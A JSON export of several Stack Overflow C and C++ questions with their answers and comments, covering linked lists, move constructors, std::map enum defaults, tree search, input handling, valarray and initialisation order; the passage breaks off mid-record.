{"tags": ["c++"], "comments": [{"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 1, "creation_date": 1429739471, "post_id": 29809505, "comment_id": 47747141, "body": "Perhaps the C tag is more appropriate?"}, {"owner": {"reputation": 2256, "user_id": 3076272, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/48919202ec2e5a16d47356c6db33a5e9?s=128&d=identicon&r=PG", "display_name": "Dan Oberlam", "link": "https://stackoverflow.com/users/3076272/dan-oberlam"}, "edited": false, "score": 0, "creation_date": 1429739943, "post_id": 29809505, "comment_id": 47747380, "body": "What is the error you see?"}], "answers": [{"tags": [], "owner": {"reputation": 7641, "user_id": 4282370, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0WI7C.jpg?s=128&g=1", "display_name": "Amnon Shochot", "link": "https://stackoverflow.com/users/4282370/amnon-shochot"}, "is_accepted": false, "score": 0, "last_activity_date": 1429740240, "creation_date": 1429740240, "answer_id": 29809746, "question_id": 29809505, "link": "https://stackoverflow.com/questions/29809505/cant-fill-in-list-with-numbers/29809746#29809746", "title": "Can&#39;t fill in list with numbers", "body": "<p>It seems like the problem is that <code>creer_cellule()</code> does not return the allocated object, thus in main you're working with an invalid pointer.</p>\n"}], "owner": {"reputation": 1, "user_id": 4821557, "user_type": "registered", "profile_image": "https://graph.facebook.com/840969869273462/picture?type=large", "display_name": "SAF", "link": "https://stackoverflow.com/users/4821557/saf"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 57, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1429791972, "creation_date": 1429739295, "last_edit_date": 1429791972, "question_id": 29809505, "link": "https://stackoverflow.com/questions/29809505/cant-fill-in-list-with-numbers", "title": "Can&#39;t fill in list with numbers", "body": "<p>I've written a program to make a list and put numbers into it, but after I put two numbers into it I get an error. Can anyone tell me why I'm getting that error? And is there are easy way to work with lists?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct element element;\nstruct element\n{\n    int val;\n    struct element *suiv;\n};\n\ntypedef element* liste;\n\nelement* creer_cellule()\n{\n    element* nouv;\n    nouv=(element*)malloc(sizeof(element));\n    if (nouv==NULL)\n    {\n        printf(\"erreur memoire pleine\");\n        exit(0);\n    }\n    else\n    {\n        nouv-&gt;suiv=NULL;\n        printf(\"donner un entier\");\n        scanf(\"%d\",&amp;nouv-&gt;val);\n    }\n}\n\nvoid inserer_queue(element* t)\n{\n    element*nouv,*p;\n    nouv=creer_cellule();\n    p=t;\n    while(p-&gt;suiv!=NULL)\n    {\n        p=p-&gt;suiv;\n    }\n    p-&gt;suiv=nouv;\n}\n\nvoid affiche_liste (element*t)\n{\n    element* p;\n    p=t;\n    while(p!=NULL)\n        printf(\"%d\",p-&gt;val);\n}\n\nvoid main(){\n    element* tete=NULL;\n    int i,n;\n    printf(\"donner le nombre d'etudiants\");\n    scanf(\"%d\",&amp;n);\n    tete=creer_cellule();\n    for(i=1;i&lt;n;i++){\n        inserer_queue(tete);\n        affiche_liste(tete);\n    }\n}\n</code></pre>\n"}, {"tags": ["c++", "c++11", "language-lawyer", "move-semantics"], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user1795160"}, "edited": false, "score": 0, "creation_date": 1429740987, "post_id": 29809655, "comment_id": 47747855, "body": "Does this mean that <code>test</code> does/might have an implicit move constructor, although it is useless for the class itself?"}, {"owner": {"reputation": 245138, "user_id": 2069064, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/e4V2X.jpg?s=128&g=1", "display_name": "Barry", "link": "https://stackoverflow.com/users/2069064/barry"}, "edited": false, "score": 3, "creation_date": 1429741336, "post_id": 29809655, "comment_id": 47747991, "body": "@MartinD. Yes. In fact, we know it does, since <code>is_move_constructible&lt;test2&gt;</code> is true."}], "tags": [], "owner": {"reputation": 245138, "user_id": 2069064, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/e4V2X.jpg?s=128&g=1", "display_name": "Barry", "link": "https://stackoverflow.com/users/2069064/barry"}, "is_accepted": true, "score": 14, "last_activity_date": 1429739848, "creation_date": 1429739848, "answer_id": 29809655, "question_id": 29809484, "link": "https://stackoverflow.com/questions/29809484/do-pure-virtual-functions-prevent-implicitly-generated-move-constructors/29809655#29809655", "title": "do pure virtual functions prevent implicitly generated move constructors?", "body": "<p><a href=\"http://en.cppreference.com/w/cpp/types/is_move_constructible\"><code>std::is_move_constructible</code></a> checks whether the type can be constructed from an rvalue argument. <code>test</code> is an abstract class type. It cannot be constructed at all, regardless of argument.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user1795160"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 471, "favorite_count": 0, "accepted_answer_id": 29809655, "answer_count": 1, "score": 6, "last_activity_date": 1429740045, "creation_date": 1429739215, "last_edit_date": 1429740045, "question_id": 29809484, "link": "https://stackoverflow.com/questions/29809484/do-pure-virtual-functions-prevent-implicitly-generated-move-constructors", "title": "do pure virtual functions prevent implicitly generated move constructors?", "body": "\n\n<pre class=\"lang-cpp prettyprint-override\"><code>#include &lt;type_traits&gt;\n\nstruct test {\n    virtual void foo() noexcept = 0;\n};\n\nstruct test2 : test {\n    void foo() noexcept override final {}   \n};\n\n// fails\nstatic_assert(std::is_move_constructible&lt;test&gt;::value, \"test not move constructible\");\n// succeeds\nstatic_assert(std::is_move_constructible&lt;test2&gt;::value, \"test2 not move constructible\");\n</code></pre>\n\n<p><a href=\"http://ideone.com/PlJlo4\" rel=\"nofollow\">(Live)</a><br>\nAccording to <a href=\"http://en.cppreference.com/w/cpp/language/move_constructor\" rel=\"nofollow\">cppreference.com</a> (and as far as I understand), <code>test</code> should have an implicitly-generated move constructor:</p>\n\n<blockquote>\n  <p>The implicitly-declared or defaulted move constructor for class T is defined as <em>deleted</em> in any of the following is true:</p>\n  \n  <ul>\n  <li>T [= test] has non-static data members that cannot be moved (have deleted, inaccessible, or ambiguous move constructors)</li>\n  <li>T has direct or virtual base class that cannot be moved (has deleted, inaccessible, or ambiguous move constructors)</li>\n  <li>T has direct or virtual base class with a deleted or inaccessible destructor</li>\n  <li>T is a union and has a variant member with non-trivial copy constructor</li>\n  <li>(until C++14) T has a non-static data member or a direct or virtual base without a move constructor that is not trivially copyable.</li>\n  </ul>\n</blockquote>\n\n<p>Why does the compiler not generate an implicit move constructor for <code>test</code>? Any why does it do so for <code>test2</code>?</p>\n"}, {"tags": ["c++", "enums", "initialization"], "comments": [{"owner": {"reputation": 18300, "user_id": 212870, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51619fe88436dc413b2c6e9498835646?s=128&d=identicon&r=PG", "display_name": "Alan Stokes", "link": "https://stackoverflow.com/users/212870/alan-stokes"}, "edited": false, "score": 1, "creation_date": 1429739168, "post_id": 29809429, "comment_id": 47747020, "body": "Zero is a valid value for X, even if it doesn&#39;t have a corresponding enumerator."}, {"owner": {"reputation": 154, "user_id": 4246048, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d2ff80c6f69f70e9a71e9b25d8d9de78?s=128&d=identicon&r=PG&f=1", "display_name": "newbie", "link": "https://stackoverflow.com/users/4246048/newbie"}, "edited": false, "score": 0, "creation_date": 1429739363, "post_id": 29809429, "comment_id": 47747098, "body": "Have you run the program and print out the values?"}, {"owner": {"reputation": 2547, "user_id": 1503898, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/CX5eA.jpg?s=128&g=1", "display_name": "Amxx", "link": "https://stackoverflow.com/users/1503898/amxx"}, "reply_to_user": {"reputation": 3784, "user_id": 2593738, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/EO83B.png?s=128&g=1", "display_name": "developerbmw", "link": "https://stackoverflow.com/users/2593738/developerbmw"}, "edited": false, "score": 1, "creation_date": 1429740563, "post_id": 29809429, "comment_id": 47747654, "body": "@Brett His point was &quot;what is the default value if you DONT set it"}], "answers": [{"comments": [{"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 3784, "user_id": 2593738, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/EO83B.png?s=128&g=1", "display_name": "developerbmw", "link": "https://stackoverflow.com/users/2593738/developerbmw"}, "edited": false, "score": 0, "creation_date": 1429740663, "post_id": 29809756, "comment_id": 47747709, "body": "@Brett, the <code>operator[]</code> function of <code>std::map</code> will add a value-initialized element to the map if there is no element corresponding to the key."}, {"owner": {"reputation": 11342, "user_id": 1144157, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/d05077a347e63679d43bfbdaf5e7b9ab?s=128&d=identicon&r=PG", "display_name": "Steephen", "link": "https://stackoverflow.com/users/1144157/steephen"}, "edited": false, "score": 0, "creation_date": 1429740672, "post_id": 29809756, "comment_id": 47747711, "body": "When you query a map with key if it is not there it will create a node in map . So you will get value zero for abc[0]. If you check size of map before you call abc[0], it will be zero. After you query its size will be 1"}, {"owner": {"reputation": 2547, "user_id": 1503898, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/CX5eA.jpg?s=128&g=1", "display_name": "Amxx", "link": "https://stackoverflow.com/users/1503898/amxx"}, "edited": false, "score": 0, "creation_date": 1429740678, "post_id": 29809756, "comment_id": 47747713, "body": "@Brett: It exists ! Have a look at <code>map::operator[]</code>. A call to this function is equivalent to: <code>(*((this-&gt;insert(make_pair(k,mapped_type()))).first)).second</code>"}, {"owner": {"reputation": 3784, "user_id": 2593738, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/EO83B.png?s=128&g=1", "display_name": "developerbmw", "link": "https://stackoverflow.com/users/2593738/developerbmw"}, "edited": false, "score": 0, "creation_date": 1429740790, "post_id": 29809756, "comment_id": 47747765, "body": "Sorry, I temporarily forgot about insertion with the <code>[]</code> operator."}, {"owner": {"reputation": 11342, "user_id": 1144157, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/d05077a347e63679d43bfbdaf5e7b9ab?s=128&d=identicon&r=PG", "display_name": "Steephen", "link": "https://stackoverflow.com/users/1144157/steephen"}, "edited": false, "score": 0, "creation_date": 1429740800, "post_id": 29809756, "comment_id": 47747772, "body": "Operator[] creating a node in map not defaulted with key value as &lt;0,0&gt;"}], "tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": true, "score": 1, "last_activity_date": 1429740284, "creation_date": 1429740284, "answer_id": 29809756, "question_id": 29809429, "link": "https://stackoverflow.com/questions/29809429/stdmap-default-value-for-enums/29809756#29809756", "title": "std::map default value for enums", "body": "<blockquote>\n  <p>Will the initialization always be zero-initialization for enumerations? namely <code>abc[0]</code> is always initialized as the enumerator corresponding to <code>0</code>?</p>\n</blockquote>\n\n<p>Yes.</p>\n\n<blockquote>\n  <p>What if we have</p>\n\n<pre><code>enum X {\n   X1 = 1,\n   ...\n</code></pre>\n  \n  <p>What will <code>abc[0]</code> be?</p>\n</blockquote>\n\n<p>It will be <code>0</code>.</p>\n\n<p>Working program (also can be seen at <a href=\"http://ideone.com/RVOfT6\" rel=\"nofollow\">http://ideone.com/RVOfT6</a>):</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;map&gt;\n\nenum X {\n  X1,\n  X2,\n  X3\n};\n\nint main()\n{\n   X x = {};\n   std::map&lt;int, X&gt; abc;\n   std::cout &lt;&lt; x &lt;&lt; std::endl;\n   std::cout &lt;&lt; abc[0] &lt;&lt; std::endl;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre>\n0\n0\n</pre>\n"}], "owner": {"reputation": 127, "user_id": 3277360, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f9973376ba5934747a9dbb430aec34f3?s=128&d=identicon&r=PG&f=1", "display_name": "user3277360", "link": "https://stackoverflow.com/users/3277360/user3277360"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 687, "favorite_count": 0, "accepted_answer_id": 29809756, "answer_count": 1, "score": 6, "last_activity_date": 1429740337, "creation_date": 1429739027, "question_id": 29809429, "link": "https://stackoverflow.com/questions/29809429/stdmap-default-value-for-enums", "title": "std::map default value for enums", "body": "<p>Let's say we have:</p>\n\n<pre><code>enum X {\n  X1,\n  X2,\n  X3\n};\n\nint func() {\n  std::map&lt;int, X&gt; abc;\n  ...\n}\n</code></pre>\n\n<p>Assume 0 is the key that is not in the container.</p>\n\n<p>I know abc[0] needs to value-initialize the X object.</p>\n\n<p>Here are the questions:</p>\n\n<p>(1) Will the initialization always be zero-initialization for enumerations? namely abc[0] is always initialized as the enumerator corresponding to 0?</p>\n\n<p>(2) What if we have</p>\n\n<pre><code>enum X {\n  X1 = 1,\n...\n</code></pre>\n\n<p>What will abc[0] be?</p>\n"}, {"tags": ["c++", "tree", "traversal"], "comments": [{"owner": {"reputation": 38854, "user_id": 2352671, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/kd1xb.jpg?s=128&g=1", "display_name": "101010", "link": "https://stackoverflow.com/users/2352671/101010"}, "edited": false, "score": 2, "creation_date": 1429739410, "post_id": 29809377, "comment_id": 47747124, "body": "<a href=\"http://en.wikipedia.org/wiki/Tree_traversal\" rel=\"nofollow noreferrer\">Depth first search or Breadth first search</a>."}, {"owner": {"reputation": 2767, "user_id": 4426074, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/e08389efd2ef9d2eea52c0d283ee2771?s=128&d=identicon&r=PG&f=1", "display_name": "mmgross", "link": "https://stackoverflow.com/users/4426074/mmgross"}, "edited": false, "score": 0, "creation_date": 1429739698, "post_id": 29809377, "comment_id": 47747250, "body": "your class <code>gennode</code> seems to be a pretty weird implementation of a node. Can you please include it, so we know how it works?"}], "owner": {"reputation": 1, "user_id": 4029553, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-nKDLDii0phc/AAAAAAAAAAI/AAAAAAAAAC4/Ei4estUXllc/photo.jpg?sz=128", "display_name": "Tro", "link": "https://stackoverflow.com/users/4029553/tro"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 903, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1429739499, "creation_date": 1429738821, "last_edit_date": 1429739499, "question_id": 29809377, "link": "https://stackoverflow.com/questions/29809377/how-to-search-for-a-node-in-a-general-tree", "title": "How to search for a node in a general tree", "body": "<p>I am trying to search through a tree like the ones below:</p>\n\n<p><img src=\"https://i.stack.imgur.com/HPHBY.png\" alt=\"enter image description here\"></p>\n\n<p>but I am having trouble with the code to do so.I want to go through every node in the tree and if it is found i want it to return true. Please help</p>\n\n<pre><code>    bool search(int data)\n    {\n        return search(root, data);//call the recursive function\n    }\n    bool search(gennode *node, int data)\n    {\n        if(node == NULL)\n        {\n            return false; \n        }\n        else if(node-&gt;item != data)\n        {\n            return search(node-&gt;firstchild, data);\n        }\n        else if(node-&gt;firstchild == NULL )\n        {\n            return search(node-&gt;siblinglist, data);\n        }\n        else if(node-&gt;siblinglist-&gt; item!= data)\n        {\n            return search(node-&gt;siblinglist, data);\n        }\n        else if(node -&gt; siblinglist == NULL)\n        {\n            return false;\n        }\n        else \n        return true;\n    return true;\n  }\n</code></pre>\n"}, {"tags": ["c++", "variables"], "comments": [{"owner": {"reputation": 2476, "user_id": 617718, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ebc779ca86f46cf2520d2c1e85cf2c09?s=128&d=identicon&r=PG", "display_name": "nestedloop", "link": "https://stackoverflow.com/users/617718/nestedloop"}, "edited": false, "score": 2, "creation_date": 1429738590, "post_id": 29809303, "comment_id": 47746727, "body": "Please post some code."}, {"owner": {"reputation": 13337, "user_id": 441899, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/368fb99f86e2264ceec0539a3746b9d3?s=128&d=identicon&r=PG", "display_name": "Jules", "link": "https://stackoverflow.com/users/441899/jules"}, "edited": false, "score": 0, "creation_date": 1429738689, "post_id": 29809303, "comment_id": 47746791, "body": "In c++, variable names are not known after compile time, so what you&#39;re asking for is impossible. See <a href=\"http://stackoverflow.com/questions/9351698/how-does-a-c-compiler-compile-variable-names?rq=1\" title=\"how does a c compiler compile variable names\">stackoverflow.com/questions/9351698/&hellip;</a> for more detail."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1429738744, "post_id": 29809303, "comment_id": 47746825, "body": "if you tried to use <code>cin &lt;&lt; ...</code> I&#39;m not surprised it didn&#39;t work. Did you try <code>cin &gt;&gt; ...</code> ? (the var name issue is impossible, but I see no evidence you even did that, so you gotta start from somewhere). You may also consider you don&#39;t need a list for this task; all you need is a sum variable and a current value variable."}, {"owner": {"reputation": 6728, "user_id": 2156952, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/3mMoE.gif?s=128&g=1", "display_name": "TrueY", "link": "https://stackoverflow.com/users/2156952/truey"}, "edited": false, "score": 0, "creation_date": 1429739722, "post_id": 29809303, "comment_id": 47747264, "body": "It can be done. Briefly on Linux: The code has to be compiled with debug info. Then read the name of the variable in the program and start a <code>gdb</code> connecting to the executable itself (if it does not work, start a script which starts gdb). The  value can be printed by gdb, quit then return from the script. But rather use a <code>map</code> instead of bare variables."}], "answers": [{"tags": [], "owner": {"reputation": 555, "user_id": 3563094, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/GTBiY.jpg?s=128&g=1", "display_name": "ChemiCalChems", "link": "https://stackoverflow.com/users/3563094/chemicalchems"}, "is_accepted": false, "score": 1, "last_activity_date": 1429738874, "creation_date": 1429738874, "answer_id": 29809390, "question_id": 29809303, "link": "https://stackoverflow.com/questions/29809303/in-c-i-cant-select-a-specific-variable-for-use-with-user-input/29809390#29809390", "title": "in c++ i cant select a specific variable for use with user input", "body": "<p>The syntax to use cin is <code>cin &gt;&gt; var;</code> not <code>cin &lt;&lt; var;</code>. Also, I recommend not <code>using namespace std;</code> and do <code>std::cin &gt;&gt; var;</code></p>\n"}, {"tags": [], "owner": {"reputation": 3784, "user_id": 2593738, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/EO83B.png?s=128&g=1", "display_name": "developerbmw", "link": "https://stackoverflow.com/users/2593738/developerbmw"}, "is_accepted": true, "score": 1, "last_activity_date": 1429739169, "creation_date": 1429739169, "answer_id": 29809467, "question_id": 29809303, "link": "https://stackoverflow.com/questions/29809303/in-c-i-cant-select-a-specific-variable-for-use-with-user-input/29809467#29809467", "title": "in c++ i cant select a specific variable for use with user input", "body": "<p>You don't need to name the input values. The code below will return the sum of all numbers entered. Enter a blank line to end the list of numbers.</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;sstream&gt;\n\n\nint main() {\n    std::string line;\n    int sum = 0;\n\n    while(true) {\n        std::getline(std::cin, line);\n\n        if (line.empty())\n            break;\n\n        int val;\n        std::istringstream(line) &gt;&gt; val;\n\n        sum += val;\n    }\n\n    std::cout &lt;&lt; sum;\n\n    return 0;\n}\n</code></pre>\n\n<p>If you do need to assign names to the input values for some reason, I suggest using a <a href=\"http://www.cplusplus.com/reference/unordered_map/unordered_map/\" rel=\"nofollow\"><code>std::unordered_map</code></a>.</p>\n"}], "owner": {"reputation": 3, "user_id": 4821533, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-yX8D3hpyGsY/AAAAAAAAAAI/AAAAAAAAACw/LgWSakGnqeA/photo.jpg?sz=128", "display_name": "jaw2233", "link": "https://stackoverflow.com/users/4821533/jaw2233"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 68, "favorite_count": 0, "accepted_answer_id": 29809467, "answer_count": 2, "score": 0, "last_activity_date": 1429740115, "creation_date": 1429738488, "last_edit_date": 1429740115, "question_id": 29809303, "link": "https://stackoverflow.com/questions/29809303/in-c-i-cant-select-a-specific-variable-for-use-with-user-input", "title": "in c++ i cant select a specific variable for use with user input", "body": "<p>I am trying to make a program where you can add an item to a list, and each item has a specific value, and at the end it tallies them all up, but I can't find a way to allow a user to type in the name of a variable and it identifies it for use! I have already attempted to use cin >> but that didn't work!</p>\n"}, {"tags": ["c++", "c++11", "wrapper", "object-construction", "valarray"], "comments": [{"owner": {"reputation": 99973, "user_id": 241631, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6099f76a0c24b09ca71f3e25eea7ce65?s=128&d=identicon&r=PG", "display_name": "Praetorian", "link": "https://stackoverflow.com/users/241631/praetorian"}, "edited": false, "score": 0, "creation_date": 1429740432, "post_id": 29809298, "comment_id": 47747600, "body": "I don&#39;t think there&#39;s any way to do that. What <code>valarray</code> functionality do you need? You might be better off implementing that functionality for your raw array."}, {"owner": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "reply_to_user": {"reputation": 99973, "user_id": 241631, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6099f76a0c24b09ca71f3e25eea7ce65?s=128&d=identicon&r=PG", "display_name": "Praetorian", "link": "https://stackoverflow.com/users/241631/praetorian"}, "edited": false, "score": 0, "creation_date": 1429741110, "post_id": 29809298, "comment_id": 47747897, "body": "@Praetorian: I&#39;ve <a href=\"http://stackoverflow.com/q/29807944/1593077\">been told</a> that valarray is a decent choice for performing bitwise operations on packed sequences of bits."}, {"owner": {"reputation": 99973, "user_id": 241631, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6099f76a0c24b09ca71f3e25eea7ce65?s=128&d=identicon&r=PG", "display_name": "Praetorian", "link": "https://stackoverflow.com/users/241631/praetorian"}, "edited": false, "score": 0, "creation_date": 1429742068, "post_id": 29809298, "comment_id": 47748305, "body": "Are you using MSVC (I think they&#39;re the ones that allow the <code>__restrict__</code> extension)? If so, take a look at <a href=\"http://stackoverflow.com/q/6850807/241631\">this</a>, in particular, the second answer and Howard Hinnant&#39;s comment under the accepted answer. Have you inspected the assembly from an optimized build with a plain <code>for</code> loop bit ANDing one element at a time? It&#39;s possible the auto vectorizer will be able to transform that into SIMD instructions."}, {"owner": {"reputation": 99973, "user_id": 241631, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6099f76a0c24b09ca71f3e25eea7ce65?s=128&d=identicon&r=PG", "display_name": "Praetorian", "link": "https://stackoverflow.com/users/241631/praetorian"}, "edited": false, "score": 0, "creation_date": 1429742978, "post_id": 29809298, "comment_id": 47748642, "body": "Seems I was remembering wrong, that&#39;s a gcc/clang extension. <a href=\"http://coliru.stacked-crooked.com/a/704455603de3ae52\" rel=\"nofollow noreferrer\">clang3.5</a> seems willing to use SIMD if you write a plain <code>for</code> loop. I couldn&#39;t manage to get gcc to make use of the xmm registers, but you might have better luck with additional optimization flags/pragmas."}, {"owner": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "reply_to_user": {"reputation": 99973, "user_id": 241631, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6099f76a0c24b09ca71f3e25eea7ce65?s=128&d=identicon&r=PG", "display_name": "Praetorian", "link": "https://stackoverflow.com/users/241631/praetorian"}, "edited": false, "score": 0, "creation_date": 1429743254, "post_id": 29809298, "comment_id": 47748739, "body": "@Praetorian: Your comments belong more to the question I linked to than here... at any rate, I&#39;m using gcc/Linux for now."}], "owner": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 248, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1429743210, "creation_date": 1429738468, "last_edit_date": 1429743210, "question_id": 29809298, "link": "https://stackoverflow.com/questions/29809298/constructing-a-valarray-using-raw-data", "title": "Constructing a valarray using raw data", "body": "<p>It seems I might be using <code>std::valarray&lt;_Tp&gt;</code>s for some computational work (suppose <code>_Tp</code> is <code>uint64_t</code>). Unfortunately, the following hold:</p>\n\n<ul>\n<li>my code receives raw arrays - <code>uint64_t*</code>s and a length value - </li>\n<li>I can't change signatures/APIs. They're <code>__restrict__</code>ed though.</li>\n<li>std::valarray's constructor which takes a <code>_Tp*</code> and a length copies the entire array.</li>\n<li>There do not seem to be methods for setting <code>std::valarray</code>'s internal data; it's even private so you can't access it in a subclass.</li>\n</ul>\n\n<p>So how do I break this Gordian knot and construct a valarray without copying my data?</p>\n"}, {"tags": ["c++", "constructor", "initialization", "circular-dependency", "initialization-list"], "comments": [{"owner": {"reputation": 205730, "user_id": 15055, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/7f71287b47b7189d11fe6d3fbc7ed2fe?s=128&d=identicon&r=PG", "display_name": "Claudiu", "link": "https://stackoverflow.com/users/15055/claudiu"}, "edited": false, "score": 1, "creation_date": 1429739179, "post_id": 29809241, "comment_id": 47747024, "body": "Why the downvote? Let me know how I can improve the question."}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1429740204, "post_id": 29809241, "comment_id": 47747507, "body": "I don&#39;t think compiler allows you to do <code>a(b)</code> because when <code>a</code> is being initialized, <code>b</code> is not initialized yet."}, {"owner": {"reputation": 205730, "user_id": 15055, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/7f71287b47b7189d11fe6d3fbc7ed2fe?s=128&d=identicon&r=PG", "display_name": "Claudiu", "link": "https://stackoverflow.com/users/15055/claudiu"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1429740244, "post_id": 29809241, "comment_id": 47747527, "body": "@user3528438: It sure does, the ideone example compiles and runs. But is it because I am lucky or because it is well-defined in the standard?"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1429740736, "post_id": 29809241, "comment_id": 47747744, "body": "Interesting, it seems like the object is &quot;allocated but not initialized&quot;. <a href=\"https://ideone.com/V5uPyr\" rel=\"nofollow noreferrer\">ideone.com/V5uPyr</a>"}], "answers": [{"comments": [{"owner": {"reputation": 205730, "user_id": 15055, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/7f71287b47b7189d11fe6d3fbc7ed2fe?s=128&d=identicon&r=PG", "display_name": "Claudiu", "link": "https://stackoverflow.com/users/15055/claudiu"}, "edited": false, "score": 0, "creation_date": 1429741613, "post_id": 29809865, "comment_id": 47748116, "body": "That&#39;s intuitive enough. So then <a href=\"https://ideone.com/V5uPyr\" rel=\"nofollow noreferrer\">user3528438&#39;s example</a> is undefined behavior because <code>m_a.m_value</code> is accessed before <code>m_a</code>&#39;s constructor runs. Thanks for digging up the reference!"}, {"owner": {"reputation": 38119, "user_id": 3959454, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d3d3eb6143879550d0e5bd67a6bf647?s=128&d=identicon&r=PG&f=1", "display_name": "Anton Savin", "link": "https://stackoverflow.com/users/3959454/anton-savin"}, "reply_to_user": {"reputation": 205730, "user_id": 15055, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/7f71287b47b7189d11fe6d3fbc7ed2fe?s=128&d=identicon&r=PG", "display_name": "Claudiu", "link": "https://stackoverflow.com/users/15055/claudiu"}, "edited": false, "score": 0, "creation_date": 1429741770, "post_id": 29809865, 